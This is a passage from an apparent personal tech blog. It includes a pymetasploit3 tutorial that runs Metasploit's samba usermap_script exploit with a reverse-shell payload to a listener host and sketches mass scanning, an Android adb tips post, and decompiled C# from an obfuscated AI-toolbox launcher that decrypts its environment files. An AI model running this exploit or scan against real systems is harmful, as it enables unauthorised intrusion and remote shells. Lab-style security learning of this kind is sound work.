<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pymetasploit3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>launch metasploit background rpc service:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get help</span></span><br><span class="line">msfrpcd -h</span><br><span class="line"><span class="comment"># start background service</span></span><br><span class="line">msfrpcd -P lazero</span><br><span class="line"><span class="comment"># or if you want foreground service</span></span><br><span class="line">msfrpcd -P lazero -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>run script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymetasploit3.msfrpc <span class="keyword">import</span> MsfRpcClient</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">PWD = <span class="string">&quot;lazero&quot;</span></span><br><span class="line">custom_module_path = <span class="string">&quot;custom_msf_module&quot;</span></span><br><span class="line"><span class="keyword">assert</span> os.path.exists(custom_module_path), (</span><br><span class="line"><span class="string">&quot;Custom module path not found at: &#x27;%s&#x27;&quot;</span> % custom_module_path</span><br><span class="line">)</span><br><span class="line"><span class="comment"># write custom python modules with:</span></span><br><span class="line"><span class="comment"># https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html</span></span><br><span class="line">client = MsfRpcClient(</span><br><span class="line">password=PWD, ssl=<span class="literal">True</span></span><br><span class="line">)  <span class="comment"># requires ssl by default. otherwise won&#x27;t work</span></span><br><span class="line"><span class="comment"># the module structure must be identical to the one at , otherwise it will not load.</span></span><br><span class="line">client.core.addmodulepath(os.path.abspath(custom_module_path))</span><br><span class="line">exploit_id = <span class="string">&quot;multi/samba/usermap_script&quot;</span></span><br><span class="line">exp_mod = client.modules.use(<span class="string">&quot;exploit&quot;</span>, exploit_id)</span><br><span class="line">RHOST = <span class="string">&quot;172.16.194.172&quot;</span></span><br><span class="line">LHOST = <span class="string">&quot;172.16.194.163&quot;</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;RHOST&quot;</span>] = RHOST  <span class="comment"># this host is not running.</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;PAYLOAD&quot;</span>] = <span class="string">&quot;cmd/unix/reverse&quot;</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;LHOST&quot;</span>] = LHOST</span><br><span class="line">msf_console = (</span><br><span class="line">client.consoles.console()</span><br><span class="line">)  <span class="comment"># you can manually read/write instead of using below method.</span></span><br><span class="line"><span class="comment"># timeout: 301 seconds.</span></span><br><span class="line">exploit_run_output = msf_console.run_module_with_output(exp_mod)  <span class="comment"># str</span></span><br><span class="line"><span class="built_in">print</span>(exploit_run_output)  <span class="comment"># now have output. but still it is not streaming.</span></span><br><span class="line"><span class="comment"># you may want to overwrite the original implementation. the data is actually produced step by step.</span></span><br><span class="line">run_output_file = <span class="string">&quot;samba_usermap_script_output.log&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(run_output_file, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(exploit_run_output)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[metasploit]&quot;</span>, <span class="string">&quot;output file saved at:&quot;</span>, run_output_file)</span><br><span class="line"><span class="comment"># thank you very much.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>To do mass scanning, first we need to obtain the default RPORT for each exploit.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module_types = [<span class="string">&#x27;exploits&#x27;</span>,<span class="string">&#x27;auxiliary&#x27;</span>, <span class="string">&quot;encoders&quot;</span>, <span class="string">&quot;nops&quot;</span>, <span class="string">&quot;payloads&quot;</span>, <span class="string">&#x27;post&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> mt_plural <span class="keyword">in</span> module_types:</span><br><span class="line">module_type = mt_plural.rstrip(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> all_module_names:</span><br><span class="line">mod = client.modules.use(module_type, name)</span><br><span class="line"><span class="comment"># get default RPORT</span></span><br><span class="line">default_rport = mod.runoptions.get(<span class="string">&quot;RPORT&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/blog/2024/03/31/a9195f8f-4cd8-4a15-ad6b-782a9b437b0a/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-31 </div>
			<div class="article-title"><a href="/blog/2024/03/31/52864fca-3c66-404f-a23c-ca32d55a180c/" title="This article offers tips for controlling Android devices, including setting the time with adb, disabling alarms, and utilizing cloud phone platforms like Redroid and Lambda. Additionally, it covers solutions to adb connection issues by suggesting troubleshooting steps such as restarting the adb server, ensuring proper USB hardware connectivity, improving power supply, and using high-quality cables.">Android控制注意事项</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>长时间不开机的机器可能会发生时间错位问题 需要用adb进行时间校准</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell <span class="built_in">date</span> <span class="string">&quot;YYYY-MM-DD HH:MM:SS&quot;</span></span><br><span class="line"><span class="comment"># sometimes you have to use &#x27;-s&#x27; flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把所有闹钟都关闭 防止关了机又打开 或者在脚本操作控制的时候出问题</p>
<hr>
<p>建议使用云手机平台(搜索：开源云手机)，虚拟手机，方便进行环境打包和重新部署。</p>
<p>redroid supports adb connection, and is a docker image</p>
<p><a target="_blank" rel="noopener" href="https://github.com/remote-android/redroid-doc">redroid-doc</a> and <a target="_blank" rel="noopener" href="https://www.dsx2020.com/homelab-mini-host-x86-docker-deploys-open-source-cloud-phone-android-redroid/">redroid tutorial</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rev1si0n/lamda">lamda</a> is a multi-source (simulator and real device support) android controlling, network capturing and reverse engineering platform</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rev1si0n/lamda/wiki">lamda wiki</a></p>
<hr>
<p>如果adb出现连接问题，可以重启adb服务</p>
<p>usb硬件出问题一般是因为供电不足，或者连接线接触不良。所以可以加强供电，以及更换更好的连接线。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb kill-server</span><br><span class="line">adb start-server</span><br><span class="line"></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/blog/2024/03/31/52864fca-3c66-404f-a23c-ca32d55a180c/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-31 </div>
			<div class="article-title"><a href="/blog/2024/03/31/94f55109-1d31-4bef-b2e7-c770e5ca9662/" title="This article discusses a code that handles file deletion, process management, and environment setup for the PDM tool using AI tools such as FaceFusion, Stable Cascade, Bark Voice Cloning, etc. The code also validates Visual Studio, kills existing processes, and syncs environments on Gitee. Additionally, AI tools like Moore-AnimateAnyone, IP-Adapter-FaceID, StreamDiffusion, Fooocus mini, RVC are available on Gitee and Bilibili with UID 486989780. The code checks Visual Studio installation, vs_BuildTools.exe, and vc.vsconfig for existence and errors if necessary files are missing.">Ai工具箱</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>AI工具箱 (EZ-AI-Starter):</p>
<p><a target="_blank" rel="noopener" href="https://www.123pan.com/s/oY9eVv-IsFnh.html">https://www.123pan.com/s/oY9eVv-IsFnh.html</a> pwd:1111</p>
<p>compiled with .net and obfusticated with pyarmor</p>
<p>containing:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">My-VITS</span><br><span class="line">SadTalker</span><br><span class="line">stable-diffusion-webui</span><br><span class="line">wav2lip</span><br><span class="line">RVC</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>code for decoding encrypted environment files:</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled with JetBrains decompiler</span></span><br><span class="line"><span class="comment">// Type: common.PyEnvUtil</span></span><br><span class="line"><span class="comment">// Assembly: common, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span></span><br><span class="line"><span class="comment">// MVID: F9EBC4D1-A1AC-4DC9-BFE0-2B1E74C84F97</span></span><br><span class="line"><span class="comment">// Assembly location: G:\works\extract-ez-ai-tool-info\EZ-AI-Starter-1.0\launcher\common.dll</span></span><br><span class="line"><span class="keyword">using</span> common.entity;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="meta">#nullable enable</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">common</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PyEnvUtil</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">compareZipAndReplace</span>(<span class="params"><span class="built_in">string</span> srcZip, <span class="built_in">string</span> targetZip</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">bool</span> flag;</span><br><span class="line"><span class="keyword">if</span> (!File.Exists(targetZip))</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!File.Exists(srcZip))</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> Exception(srcZip + <span class="string">&quot; not found.&quot;</span>);</span><br><span class="line">flag = !Util.getFileHash(srcZip).Equals(Util.getFileHash(targetZip));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">File.Copy(srcZip, targetZip, <span class="literal">true</span>);</span><br><span class="line">Util.unZip(targetZip, Path.Combine(Path.GetDirectoryName(targetZip), Path.GetFileNameWithoutExtension(targetZip)), (Action&lt;<span class="built_in">string</span>&gt;) <span class="literal">null</span>, <span class="literal">false</span>, isJoin: <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">detectVCInstalled</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">ProcessStartInfo startInfo = <span class="keyword">new</span> ProcessStartInfo()</span><br><span class="line">&#123;</span><br><span class="line">FileName = GlobalVariable.assemblyDir + <span class="string">&quot;\\vswhere.exe&quot;</span>,</span><br><span class="line">Arguments = <span class="string">&quot; -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath&quot;</span>,</span><br><span class="line">RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">CreateNoWindow = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (!File.Exists(startInfo.FileName))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;error: vswhere not found!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">Process process = Process.Start(startInfo);</span><br><span class="line"><span class="keyword">if</span> (process == <span class="literal">null</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">process.WaitForExit();</span><br><span class="line"><span class="built_in">string</span> end = ((TextReader) process.StandardOutput).ReadToEnd();</span><br><span class="line"><span class="keyword">if</span> (end == <span class="literal">null</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">string</span>[] strArray = end.Trim().Split(<span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">1</span>]</span><br><span class="line">&#123;</span><br><span class="line">Environment.NewLine</span><br><span class="line">&#125;, StringSplitOptions.RemoveEmptyEntries);</span><br><span class="line"><span class="keyword">return</span> strArray != <span class="literal">null</span> &amp;&amp; strArray.Length != <span class="number">0</span> &amp;&amp; Directory.Exists(strArray[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">installVC</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Visual Studio Installer安装中...&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> str = GlobalVariable.assemblyDir + <span class="string">&quot;\\vc.vsconfig&quot;</span>;</span><br><span class="line">ProcessStartInfo startInfo = <span class="keyword">new</span> ProcessStartInfo()</span><br><span class="line">&#123;</span><br><span class="line">FileName = GlobalVariable.assemblyDir + <span class="string">&quot;\\vs_BuildTools.exe&quot;</span>,</span><br><span class="line">Arguments = <span class="string">&quot; --passive --norestart --config \&quot;&quot;</span> + str + <span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">CreateNoWindow = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (!File.Exists(str))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;error: vc.vsconfig not found!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!File.Exists(startInfo.FileName))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;error: vs_BuildTools not found!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">Process process = Process.Start(startInfo);</span><br><span class="line"><span class="keyword">if</span> (process != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">process.WaitForExit();</span><br><span class="line">Thread.Sleep(<span class="number">10000</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">Process[] array = ((IEnumerable&lt;Process&gt;) Process.GetProcessesByName(<span class="string">&quot;setup&quot;</span>)).Where&lt;Process&gt;((Func&lt;Process, <span class="built_in">bool</span>&gt;) (p =&gt; p.MainWindowTitle == <span class="string">&quot;Visual Studio Installer&quot;</span> || p.GetMainModuleFileName().Contains(<span class="string">&quot;Visual Studio\\Installer&quot;</span>))).ToArray&lt;Process&gt;();</span><br><span class="line"><span class="keyword">if</span> (array != <span class="literal">null</span> &amp;&amp; array.Length != <span class="number">0</span>)</span><br><span class="line">Thread.Sleep(<span class="number">500</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!PyEnvUtil.detectVCInstalled())</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Visual Studio Installer安装失败，极有可能是网络波动造成的。务必关闭梯子、加速器等软件，然后关闭本窗口后再重装环境！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Visual Studio Installer安装成功！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;error：vs_BuildTools启动失败，请退出后重试！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">prepareEnv</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">PyEnvUtil.compareZipAndReplace(Path.Combine(GlobalVariable.customPythonLibPath, <span class="string">&quot;pdm.zip&quot;</span>), Path.Combine(GlobalVariable.commonPythonHome, <span class="string">&quot;Lib\\site-packages\\pdm.zip&quot;</span>));</span><br><span class="line">PyEnvUtil.compareZipAndReplace(Path.Combine(GlobalVariable.customPythonLibPath, <span class="string">&quot;pyarmor_runtime_000000.zip&quot;</span>), Path.Combine(GlobalVariable.commonPythonHome, <span class="string">&quot;Lib\\pyarmor_runtime_000000.zip&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!PyEnvUtil.detectVCInstalled())</span><br><span class="line">flag = PyEnvUtil.installVC();</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">installPythonEnvByConsole</span>(<span class="params">Application app, <span class="keyword">out</span> Process pdmInstallProcess_</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">pdmInstallProcess_ = (Process) <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (!PyEnvUtil.prepareEnv())</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;重要提示：如果你的windows用户名是中文或者含有特殊符号，安装环境会失败！会出现这样的错误: &#x27;gbk&#x27; codec can&#x27;t decode byte...&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">&quot;  这时，你要修改你的用户名为英文字母，或者重新创建一个只有英文字母的管理员账户（推荐做法），使用这个用户进入系统，就能解决这个问题了！&quot;</span>);</span><br><span class="line">Console.ResetColor();</span><br><span class="line">Process pdmInstallProcess = (Process) <span class="literal">null</span>;</span><br><span class="line"><span class="built_in">string</span> pythonEnvName = app.getPythonEnvName();</span><br><span class="line"><span class="built_in">string</span> str = Path.Combine(GlobalVariable.appEnvBasePath, pythonEnvName);</span><br><span class="line">Directory.CreateDirectory(str);</span><br><span class="line">PythonEnvInfo pythonEnvInfo = app.getPythonEnvInfo();</span><br><span class="line"><span class="built_in">string</span> absFilePath1 = Path.Combine(GlobalVariable.envInfoDir, pythonEnvInfo.pdmEnvFilePrefix + <span class="string">&quot;.lock.s&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> absFilePath2 = Path.Combine(GlobalVariable.envInfoDir, pythonEnvInfo.pdmEnvFilePrefix + <span class="string">&quot;.toml.s&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> decryptedPdmLockFile = Path.GetTempFileName();</span><br><span class="line"><span class="built_in">string</span> decryptedPdmPyprojectFile = Path.GetTempFileName();</span><br><span class="line">Util.writeToFile(Util.readEncryptedFileContent(absFilePath1), decryptedPdmLockFile);</span><br><span class="line">Util.writeToFile(Util.readEncryptedFileContent(absFilePath2), decryptedPdmPyprojectFile);</span><br><span class="line"><span class="built_in">string</span> content = Path.Combine(GlobalVariable.commonPythonHome, <span class="string">&quot;python.exe&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> pythonInterpreterPathFile = Path.Combine(str, <span class="string">&quot;.pdm-python&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> absFilePath3 = pythonInterpreterPathFile;</span><br><span class="line">Util.writeToFile(content, absFilePath3);</span><br><span class="line"><span class="built_in">string</span> pdmTempConfigFilePath = Path.GetTempFileName();</span><br><span class="line">Util.writeToFile(GlobalVariable.pdmConfigFileContent, pdmTempConfigFilePath);</span><br><span class="line">Action action = (Action) (() =&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(decryptedPdmLockFile))</span><br><span class="line">File.Delete(decryptedPdmLockFile);</span><br><span class="line"><span class="keyword">if</span> (File.Exists(decryptedPdmPyprojectFile))</span><br><span class="line">File.Delete(decryptedPdmPyprojectFile);</span><br><span class="line"><span class="keyword">if</span> (File.Exists(pythonInterpreterPathFile))</span><br><span class="line">File.Delete(pythonInterpreterPathFile);</span><br><span class="line"><span class="keyword">if</span> (File.Exists(pdmTempConfigFilePath))</span><br><span class="line">File.Delete(pdmTempConfigFilePath);</span><br><span class="line"><span class="keyword">if</span> (pdmInstallProcess == <span class="literal">null</span> || pdmInstallProcess.HasExited)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">pdmInstallProcess.Kill();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">ProcessStartInfo processStartInfo = <span class="keyword">new</span> ProcessStartInfo()</span><br><span class="line">&#123;</span><br><span class="line">FileName = Path.Combine(GlobalVariable.commonPythonHome, <span class="string">&quot;python.exe&quot;</span>),</span><br><span class="line">Arguments = <span class="string">&quot; -m pdm sync&quot;</span>,</span><br><span class="line">CreateNoWindow = <span class="literal">false</span>,</span><br><span class="line">UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">WorkingDirectory = str</span><br><span class="line">&#125;;</span><br><span class="line">processStartInfo.EnvironmentVariables[<span class="string">&quot;PDM_ENTRY_CHECK&quot;</span>] = <span class="string">&quot;PDM_ENTRY_CHECK&quot;</span>;</span><br><span class="line">processStartInfo.EnvironmentVariables[<span class="string">&quot;PDM_CONFIG_FILE&quot;</span>] = pdmTempConfigFilePath;</span><br><span class="line">processStartInfo.EnvironmentVariables[<span class="string">&quot;PDM_LOCKFILE&quot;</span>] = decryptedPdmLockFile;</span><br><span class="line">processStartInfo.EnvironmentVariables[<span class="string">&quot;PDM_PYPROJECT_FILE&quot;</span>] = decryptedPdmPyprojectFile;</span><br><span class="line">processStartInfo.EnvironmentVariables[<span class="string">&quot;PDM_ARIA2&quot;</span>] = Path.Combine(GlobalVariable.assemblyDir, <span class="string">&quot;dlib&quot;</span>);</span><br><span class="line">processStartInfo.EnvironmentVariables[<span class="string">&quot;PDM_DELETE_ALL_PTH&quot;</span>] = <span class="string">&quot;111&quot;</span>;</span><br><span class="line">pdmInstallProcess = <span class="keyword">new</span> Process()</span><br><span class="line">&#123;</span><br><span class="line">StartInfo = processStartInfo</span><br><span class="line">&#125;;</span><br><span class="line">pdmInstallProcess_ = pdmInstallProcess;</span><br><span class="line">pdmInstallProcess.Start();</span><br><span class="line">pdmInstallProcess.WaitForExit();</span><br><span class="line">Util.writeToFile(app.getPythonEnvInfo().version.ToString(), Path.Combine(str, <span class="string">&quot;env.version&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(ex.Message);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">action();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title">startEnvInstallProcess</span>(<span class="params">Application app</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Process.Start(<span class="keyword">new</span> ProcessStartInfo()</span><br><span class="line">&#123;</span><br><span class="line">FileName = Path.Combine(GlobalVariable.assemblyDir, <span class="string">&quot;envInstall.exe&quot;</span>),</span><br><span class="line">Arguments = app.moduleDir + <span class="string">&quot;|&quot;</span> + GlobalVariable.userSettings[GlobalVariable.globalKey][<span class="string">&quot;GPUPlatform&quot;</span>],</span><br><span class="line">UseShellExecute = <span 